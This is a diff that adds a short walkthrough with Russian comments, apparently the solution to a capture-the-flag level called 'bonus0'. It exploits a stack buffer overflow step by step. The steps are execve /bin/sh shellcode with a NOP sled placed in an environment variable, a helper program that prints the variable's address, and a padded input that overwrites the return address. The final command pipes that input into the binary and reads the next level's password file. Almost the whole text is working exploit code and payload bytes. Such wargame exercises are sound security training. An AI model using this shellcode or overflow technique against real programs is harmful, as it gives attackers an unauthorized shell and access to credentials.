@@ -1,0 +1,14 @@
+# 1. Найти функции main, p и pp при помощи gdb
+# 2. В функции p ввод записывается в буфер размера 4096, можно переписать указатель возврата
+# 3. Взять шелл-код (http://shell-storm.org/shellcode/files/shellcode-575.php)
+    SHELLCODE="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+# 4. Сохранить в переменной окружения шелл код с нопами
+    export BONUS0=$(python -c "print '\x90' * 100 + '$SHELLCODE'")
+# 5. Написать код для определения адреса этой переменной
+    echo -e '#include <stdio.h>\nint main() {printf("%p\\n", (void *)getenv("BONUS0"));}' > /tmp/bonus0.c
+# 6. Скомпилировать, запустить, найти адрес
+    gcc /tmp/bonus0.c -o /tmp/bonus0 && /tmp/bonus0
+# 7. Создать строку с адресом переменной с шелл-кодом
+    python -c "print 'x' * 4095 + '\n' + 'x' * 9 + '\x90\xfe\xff\xbf' + 'x' * 7" > /tmp/bonus0
+# 8. Запустить программу с файлом и забрать пароль
+    (cat /tmp/bonus0 - | ./bonus0) <<< "cat /home/user/bonus1/.pass"
